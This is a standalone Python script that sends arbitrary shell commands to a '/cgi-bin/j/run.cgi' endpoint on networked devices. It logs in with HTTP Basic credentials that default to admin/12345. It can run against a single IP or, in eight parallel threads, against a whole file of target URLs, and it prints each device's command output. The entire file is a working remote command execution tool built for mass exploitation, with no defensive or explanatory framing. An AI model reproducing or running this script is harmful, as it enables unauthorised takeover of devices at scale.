#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import sys
import base64
import argparse
import requests
import threading

class Parser(argparse.ArgumentParser):

    def __init__(self):
        super(Parser, self).__init__()

    @staticmethod
    def optparse():
        parser = argparse.ArgumentParser()
        group = parser.add_mutually_exclusive_group()
        group.add_argument(
            "-i", "--ip", dest="ipAddress", metavar="ip", default="192.168.1.10",
            help="specify ip address (default: 192.168.1.10)"
        )
        parser.add_argument(
            "-p", "--port", dest="portNumber", metavar="port", default="80",
            help="specify port number (default: 80)"
        )
        group.add_argument(
            "-l", "--list", dest="urlList", metavar="list",
            help="specify url file path (example: ./urls.txt)"
        )
        parser.add_argument(
            "-u", "--name", dest="userName", metavar="name", default="admin",
            help="specify username (default: admin)"
        )
        parser.add_argument(
            "-k", "--pass", dest="userPass", metavar="pass", default="12345",
            help="specify userpass (default: 12345)"
        )
        parser.add_argument(
            "-c", "--cmd", dest="userCmd", metavar="cmd", required=True,
            help="execute command (default: None)"
        )
        return parser.parse_args()

opt = Parser().optparse()

ip = opt.ipAddress
port = opt.portNumber
path = opt.urlList
username = opt.userName
userpass = opt.userPass
usercmd = opt.userCmd
cred = (base64.b64encode((username+':'+userpass).encode('utf-8'))).decode()
cmd = (base64.b64encode((usercmd).encode('utf-8'))).decode()

headers = {
    "Authorization": "Basic {}".format(cred)
}

thread_nums = 8
sema = threading.BoundedSemaphore(value=thread_nums)

def worker_by_url(url):
    with sema:
        try:
            if url and usercmd:
                r = requests.get("http://{}/cgi-bin/j/run.cgi?cmd={}".format(url, cmd), headers=headers, timeout=10)
            else:
                print("[!] Unknown Command, Exit")
                sys.exit()
            if r.status_code == 200:
                print("[+] Sending Command to:", url, usercmd, flush=True)
            else:
                print("[-] Request Failed:", url, r.status_code, flush=True)
        
        except Exception as e:
            print("[!] Error:", e)
            pass
        except BrokenPipeError:
            pass

def worker_by_ip(ip):
    with sema:
        try:
            if ip and port and usercmd:
                r = requests.get("http://{}:{}/cgi-bin/j/run.cgi?cmd={}".format(ip, port, cmd), headers=headers, timeout=10)
            elif ip and usercmd:
                r = requests.get("http://{}/cgi-bin/j/run.cgi?cmd={}".format(ip, usercmd), headers=headers, timeout=10)
            else:
                print("[!] Unknown Command, Exit")
                sys.exit()
            if r.status_code == 200:
                print("[+] Sending Command to:", ip, flush=True)
                print(r.text, flush=True)
            else:
                print("[-] Request Failed:", ip, port, r.status_code, flush=True)
        
        except Exception as e:
            print("[!] Error:", e)
            pass
        except BrokenPipeError:
            pass

def main():
    global ip
    if path:
        threads = []
        with open(path, encoding='utf-8') as f:
            lists = f.readlines()
            for line in lists:
                t = threading.Thread(target=worker_by_url, args=(line.strip(), ), daemon=True)
                threads.append(t)
                t.start()
        for t in threads:
            t.join()
    else:
        worker_by_ip(ip)

if __name__ == '__main__':
    try:
        main()
    except IOError:
        print("[!] File is not accessible")
    except (KeyboardInterrupt, SystemExit):
        print("[*] Stopped")
        sys.exit()
